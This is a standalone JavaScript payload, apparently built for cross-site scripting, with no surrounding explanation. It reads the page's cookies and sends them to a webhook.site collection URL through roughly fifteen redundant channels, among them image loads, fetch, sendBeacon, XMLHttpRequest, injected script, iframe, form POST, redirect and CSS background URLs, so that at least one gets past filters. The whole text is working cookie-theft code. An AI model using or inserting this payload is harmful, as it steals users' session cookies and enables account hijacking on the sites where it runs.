(() => {
  const c = encodeURIComponent(document.cookie);
  const u = "https://webhook.site/b8b92b0d-c75a-466c-b909-d87bc1dca42c?cookie=" + c;

  try { new Image().src = u; } catch(e) {}
  try { fetch(u).catch(()=>{}); } catch(e) {}
  try { navigator.sendBeacon && navigator.sendBeacon(u); } catch(e) {}
  try { let x = new XMLHttpRequest(); x.open("GET", u, true); x.send(); } catch(e) {}
  try { let s = document.createElement("script"); s.src = u; document.body.appendChild(s); } catch(e) {}
  try { let i = document.createElement("iframe"); i.src = u; document.body.appendChild(i); } catch(e) {}
  try { let f = document.createElement("form"); f.action=u; f.method="POST"; document.body.appendChild(f); f.submit(); } catch(e) {}
  try { location.href = u; } catch(e) {}
  try { let d = document.createElement("div"); d.style.backgroundImage = `url('${u}')`; document.body.appendChild(d); } catch(e) {}
  try { let a = document.createElement("a"); a.href = u; a.click(); } catch(e) {}
  try { let b = new Blob([c], {type: "text/plain"}); let l = URL.createObjectURL(b); fetch(u + "&blob=" + l); } catch(e) {}
  try { let img = document.createElement("img"); img.setAttribute("src", u); document.body.appendChild(img); } catch(e) {}
  try { let svg = `<svg><image href="${u}"/></svg>`; document.body.innerHTML += svg; } catch(e) {}
  try { let s = document.createElement("style"); s.innerHTML = `body{background:url('${u}')}`; document.head.appendChild(s); } catch(e) {}
  try { let l = document.createElement("link"); l.rel="stylesheet"; l.href=u; document.head.appendChild(l); } catch(e) {}

})();
